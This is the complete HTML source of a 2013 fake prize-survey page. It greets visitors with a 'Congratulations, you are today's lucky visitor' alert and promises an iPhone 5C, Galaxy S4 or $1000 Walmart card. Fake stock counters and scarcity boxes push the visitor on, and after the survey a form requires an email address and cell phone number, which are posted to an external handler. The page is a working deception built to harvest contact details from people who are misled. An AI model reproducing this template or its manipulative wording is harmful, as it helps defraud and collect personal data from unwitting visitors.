<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>Survey 2013</title>
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
		<link href="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/css/style.css" rel="stylesheet" type="text/css" />
					<link href="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/css/../../../../_common/logos/css/qr/style2.css" rel="stylesheet" type="text/css" />
				<script src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/js/script.js"></script>
		<!--[if IE]>
			<style>
				.prize_box {
		    		border: none;
					background:url(http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/large_box.gif) no-repeat;
				}
			</style>
		<![endif]-->		
		<script type="text/javascript">
			
			$(document).ready(function (){
				initForm('','','');
				initStock('');
				initPage();
			});
		</script>
	

<script src='http://static.popular-prizes.prize-savingsonline.info/templates/_common/js/date/returnDate.en.js'></script>
<!-- STARTALERT -->
<script type="text/javascript">
alert("************************************************\n\nCongratulations!\n\nYou are Todays Lucky Visitor.\n\nClick OK to continue\n\n************************************************");	
</script>
<!-- ENDALERT -->
<meta name="robots" content="noindex, nofollow" />
</head>
<body>


<div class="container1">
	<div class="sidebar"><div class="sb1"></div><div class="sb2"></div></div>
	<div class="container2">
		<div class="container3">
					<div class="header">
						<div class="wrapper">
							<!-- LOGO START -->
															<div class="logo left"><img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/../images/../../../_common/logos/logo_qr-code.gif"/></div>	
														<!-- LOGO END -->
							<div class="clear"></div>
							<div class="jdate right"><script type="text/javascript">{returnDate("full",1)}</script></div>
							<div class="clear"></div>
						</div>
					</div>
					<div class="content_container">	
						<div class="wrapper">
							<div class="wp">
								<div class="wp fade"></div>
								<div class="survey_text">
									<div class="start_page_left left">
										<h1>
											Congratulations										</h1>
										<p>	
											You are today’s 100,000th visitor!<br/>
											Complete this 30 second survey and claim your reward!
										</p>
										<div class="link">
											<div class="btn rollover start_link"><span>Start Now! &rsaquo;</span></div>
										</div>
									</div>
									<div class="start_page_right left">
										<div class="start_image">
											<div class="start_page_image">
												<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/blue_survey/images/walmart-apple-samsung.png"/>
											</div>
											<div class="start_page_reward_list">
												Today's Rewards include:<br/>
												an <strong>iPhone 5C</strong><sup></sup>, a <strong>$1000 Walmart Card</strong><sup></sup>, or a <strong>Galaxy S4</strong><sup></sup>											</div>
										</div>	
									</div>
									<div class="clear"></div>
								</div>
								<div class="questions">
									<div id="question1" class="question">
										<h1 class="question_number">Question 1 of 3</h1>
										<div class="question_text">
											Are you male or female?
											<div class="answers">
												<ul class="answer_list">
													<li onclick="collectAnswer('gender','M');nextQuestion(2);"><a>Male</a></li>
													<li onclick="collectAnswer('gender','F');nextQuestion(2);"><a>Female</a></li>
												</ul>
											</div>
										</div>
									</div><!-- question -->
						
																			<div id="question2" class="question">
										<h1 class="question_number">Question 2 of 3</h1>
										<div class="question_text">
											Where are you viewing this from?
											<div class="answers">
												<ul class="answer_list">
													<li onclick="nextQuestion(3);"><a>Home</a></li>
													<li onclick="nextQuestion(3);"><a>Work</a></li>
													<li onclick="nextQuestion(3);"><a>School</a></li>
													<li onclick="nextQuestion(3);"><a>Other</a></a></li>
												</ul>
											</div>
										</div>
									</div><!-- question -->
									
									
									<div id="question3" class="question">
										<h1 class="question_number">Question 3 of 3</h1>
										<div class="question_text">
											How many hours do you spend online daily?
											<div class="answers">
												<ul class="answer_list">
													<li onclick="nextQuestion(4,'loader');"><a><1</a></li>
													<li onclick="nextQuestion(4,'loader');"><a>1-2</a></li>
													<li onclick="nextQuestion(4,'loader');"><a>2-3</a></li>
													<li onclick="nextQuestion(4,'loader');"><a>3+</a></li>
												</ul>
											</div>
										</div>
									</div><!-- question -->
									
															
									<div id="question4" class="question">
										<div class="loader">
											<p>Submitting Responses...</p>
											<div class="loader_bar"></div>
										</div>	
									</div><!-- question -->
						
									<div id="question5" class="question">
										<div class="prize_text">
											<strong>Thank you for your input. Select a product below for your chance to win.</strong>
										</div><br/>
										<div class="prize_boxes clearfix">
											<div class="prize_box prize1">
												<div class="prize">
													<div class="stock_box">Out of Stock</div>
													<h1 class="prize_title">iPhone 5C</h1>
													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_iphone5c.jpg"/>
													<p>Quantity Remaining <span class="quantity">3</span></p>
												</div>
												<div class="prize_select">
													<div class="btn rollover" onclick="nextQuestion(6);selectPrize('prize1', 'iPhone 5C', 'FLUiphone4cUS.html' , '', 'iphone5c');"><span>Select &rsaquo;</span></div>
												</div>
											</div>
											<div class="prize_box prize2 middle">
												<div class="prize">
													<div class="stock_box">Out of Stock</div>					
													<h1 class="prize_title">$1000 Walmart Card</h1>
													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_walmart1000.jpg"/>
													<p>Quantity Remaining <span class="quantity">4</span></p>
												</div>
												<div class="prize_select">
												<div class="btn rollover" onclick="nextQuestion(6);selectPrize('prize2', '$1000 Walmart Card', 'FLU477walmartUS.html', '', 'walmart1000');"><span>Select &rsaquo;</span></div>
												</div>
											</div>
											<div class="prize_box prize3">
												<div class="prize">
													<div class="stock_box">Out of Stock</div>							
													<h1 class="prize_title">Galaxy S4</h1>
													<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/prize_galaxys4.jpg"/>
													<p>Quantity Remaining <span class="quantity">2</span></p>
												</div>
												<div class="prize_select">
													<div class="btn rollover" onclick="nextQuestion(6); selectPrize('prize3', 'Galaxy S4', 'FLU1765S4US.html', '', 'galaxys4');"><span>Select &rsaquo;</span></div>
												</div>
											</div>
										</div>
									</div><!-- question -->
									<div id="question6" class="question">
										<div class="prize_flippy" id="prize1" style="margin-top: 91px;">
											<p style="line-height:30px;">You selected the <span>iPhone 5C<sup>®</sup></span></p>
											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/iphone5c2.png">
										</div>
										<div class="prize_flippy" id="prize2" style="margin-top: 64.5px;">
											<p style="line-height:30px;">You selected the <span>$1000 Walmart Card<sup>®</sup></span></p>
											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/walmart10002.png">
										</div>
										<div class="prize_flippy" id="prize3" style="margin-top: 53.5px;">
											<p style="line-height:30px;">You selected the <span>Galaxy S4<sup>®</sup></span></p>
											<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/prizes/images/galaxys42.png">
										</div>
										<div id="form_details">
											<div class="form_text">
												<strong>Thank you for your response.</strong><br/>
												Please enter your information to continue. Participation is required.						
											</div>
											<div class="form_title">
												Please enter your information to continue
											</div>
											<div class="form">
												<form id="form1" action="go.html" method="post">
													<table width="425" cellpadding="2" cellspacing="2" id="shipping_table">
														<tr id="form_email">
															<td class="label">Email:</td>
															<td colspan="3" align="left" valign="middle">
																<input class="email input" type="text" name='email' id='email'>
															</td>
														</tr>
														<tr id="form_cell">
															<td class="label">Cell Phone:</td>
															<td align="left" valign="middle" >
																<input class="mobile input" name='cell1' id='cell1' maxlength="3" type="text" onkeypress="return numbersonly(this, event)" onKeyUp="moveFocus(this,'cell2')"/>
															</td>
															<td align="left" valign="middle" >
																<input class="mobile input" name='cell2' id='cell2' maxlength="3" type="text" onkeypress="return numbersonly(this, event)" onKeyUp="moveFocus(this,'cell3')"/>
																</td>
															<td align="left" valign="middle"  > 
																<input class="mobile input" name='cell3' id='cell3' maxlength="4" type="text" onkeypress="return numbersonly(this, event)" />
															</td>
														</tr>
														<tr>
															<td>&nbsp;</td>
															<td colspan="3" class="submit" align="left" valign="middle">
															<div class="btn rollover" style="width: 175px;" onclick="final_validate(); return false;"><span>Validate &rsaquo;</span></div>
															</td>
														</tr>
													</table>
												</form>
											</div>
										</div><!-- form_details -->
										<div id="form_loader">
											<div class="form_loader">
												Checking availibility...<br/>
											</div>
											<div class="form">
												<div class="loader_bar"></div>
											</div>
										</div><!-- form_details -->
						
									</div><!-- question -->
								</div><!-- questions -->
							</div><!--wp-->
						</div><!--wrapper-->
						<div class="footer" id='footer'>
							<div class="wrapper">
								<p>
								<a href="terms/privacy.html" target="_blank" id='privacy'>Privacy</a>&nbsp;&nbsp;&nbsp;
								<a href="terms/terms.html" target="_blank" id='terms'>Terms</a>&nbsp;&nbsp;&nbsp;
								<a href="terms/aboutus.html" target="_blank" id='aboutus'>About Us</a></p>
								<p>&copy; 2013 All rights reserved</p>
							</div>
						</div>
					</div><!-- content_container -->
				</div><!-- container3 -->	
			</div><!-- container2 -->
			<div class="clear"></div><!-- clear container2 float-->				
			
			<div class="sticky_footer">
				<div class="footer2">
					<ul>           
						<li>&copy; 2013&nbsp;All rights reserved. - </li>
						<li><a target="_blank" href="terms/privacy.html">Privacy</a></li>
						<li><a target="_blank" href="terms/terms.html">Terms</a></li>
						<li><a target="_blank" href="terms/aboutus.html">About Us</a></li>
						<li class="footer_language"><a>English (US)</a></li>
						<li class="footer_language"><a>Français (Canada)</a></li>
						<li class="footer_language"><a>Español</a></li>
						<li class="footer_language"><a>Português(Brasil)</a></li>
						<li class="footer_language"><a>Français(France)</a></li>
					</ul>
					</div>
					<div class="bb_wrap">
					<div class="bb_content">complete 30 second survey and receive prize
						<span class="uparrow"></span>
					</div>
				</div>
			</div>
		</div><!-- container1 -->	
		
	
		
			<div id="img_preload" style="position: absolute; overflow: hidden; height: 0px;">
				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/macbook2.jpg"/>
				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/iphone2.jpg"/>
				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/ipad2.jpg"/>
				<div class="loader_bar"></div>
				<!--[if IE]>
				<img src="http://static.popular-prizes.prize-savingsonline.info/templates/_common/_templates/big_box_startimg_imagekey/images/large_box.gif"/>
				<![endif]-->
			</div>
			
	

</body>
</html><!-- Mini 1386703581 -->